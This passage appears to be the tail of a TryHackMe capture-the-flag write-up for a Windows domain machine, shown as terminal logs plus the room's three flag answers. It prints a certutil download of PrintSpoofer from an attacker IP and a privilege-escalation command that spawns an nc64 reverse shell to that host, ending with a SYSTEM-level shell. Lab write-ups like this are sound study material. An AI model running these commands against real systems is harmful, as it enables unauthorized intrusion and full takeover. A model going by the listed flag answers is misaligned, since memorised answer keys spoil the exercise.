+10.10.85.102 - - [22/Dec/2022 18:14:20] "GET /PrintSpoofer.exe HTTP/1.1" 200 -
+
+C:\Users\edwardle.WINDCORP\Desktop>certutil.exe -urlcache -f http://10.8.19.103:1337/PrintSpoofer.exe PrintSpoofer.exe
+certutil.exe -urlcache -f http://10.8.19.103:1337/PrintSpoofer.exe PrintSpoofer.exe
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+
+C:\Users\edwardle.WINDCORP\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 84E1-0562
+
+ Directory of C:\Users\edwardle.WINDCORP\Desktop
+
+12/22/2022  03:14 PM    <DIR>          .
+12/22/2022  03:14 PM    <DIR>          ..
+05/31/2020  09:12 AM                47 Flag 2.txt
+12/22/2022  03:04 PM           138,017 nc.exe
+12/22/2022  03:06 PM            45,272 nc64.exe
+12/22/2022  03:14 PM            27,136 PrintSpoofer.exe
+               4 File(s)        210,472 bytes
+               2 Dir(s)  43,867,873,280 bytes free
+```
+```text
+┌──(kali㉿kali)-[~/ra2]
+└─$ rlwrap nc -lnvp 7777                                  
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::7777
+Ncat: Listening on 0.0.0.0:7777
+
+C:\Users\edwardle.WINDCORP\Desktop>.\PrintSpoofer.exe -c ".\nc64.exe -e cmd.exe 10.8.19.103 7777"
+.\PrintSpoofer.exe -c ".\nc64.exe -e cmd.exe 10.8.19.103 7777"
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[!] CreateProcessAsUser() failed because of a missing privilege, retrying with CreateProcessWithTokenW().
+[+] CreateProcessWithTokenW() OK
+```
+```text
+┌──(kali㉿kali)-[~/ra2]
+└─$ rlwrap nc -lnvp 7777                                  
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::7777
+Ncat: Listening on 0.0.0.0:7777
+Ncat: Connection from 10.10.85.102.
+Ncat: Connection from 10.10.85.102:55427.
+Microsoft Windows [Version 10.0.17763.1158]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+windcorp\fire$
+
+C:\Windows\system32>cd ..\..
+cd ..\..
+```
+```text
+C:\>cd Users\Administrator\Desktop
+cd Users\Administrator\Desktop
+
+C:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 84E1-0562
+
+ Directory of C:\Users\Administrator\Desktop
+
+06/01/2020  09:36 AM    <DIR>          .
+06/01/2020  09:36 AM    <DIR>          ..
+05/31/2020  01:32 AM                47 Flag 3.txt
+               1 File(s)             47 bytes
+               2 Dir(s)  43,867,742,208 bytes free
+
+C:\Users\Administrator\Desktop>type "Flag 3.txt"
+type "Flag 3.txt"
+THM{9a8b9f4f3af2bce68885106c1c8473ab85e0eda0}
+
+yep!! :)
+```
+![[Pasted image 20221222144248.png]]
+![[Pasted image 20221222144303.png]]
+![[Pasted image 20221222144450.png]]
+![[Pasted image 20221222144506.png]]
+![[Pasted image 20221222144527.png]]
+![[Pasted image 20221222144546.png]]
+![[Pasted image 20221222145741.png]]
+![[Pasted image 20221222150032.png]]
+![[Pasted image 20221222175142.png]]
+![[Pasted image 20221222175244.png]]
+![[Pasted image 20221222175650.png]]
+What is flag 1?
+What is flag 2?
+What is flag 3?
+
+## Flags / Answers
+- ***THM{Allowing nonsecure dynamic updates is a significant security vulnerability because updates can be accepted from untrusted sources}***
+- ***THM{8a1d460dfe345f8edd09d45ae00e5c1c14d12c89}***
+- ***THM{9a8b9f4f3af2bce68885106c1c8473ab85e0eda0}***
+
+## Notes / Lessons Learned
+[[Advent of Cyber 2022]]
+
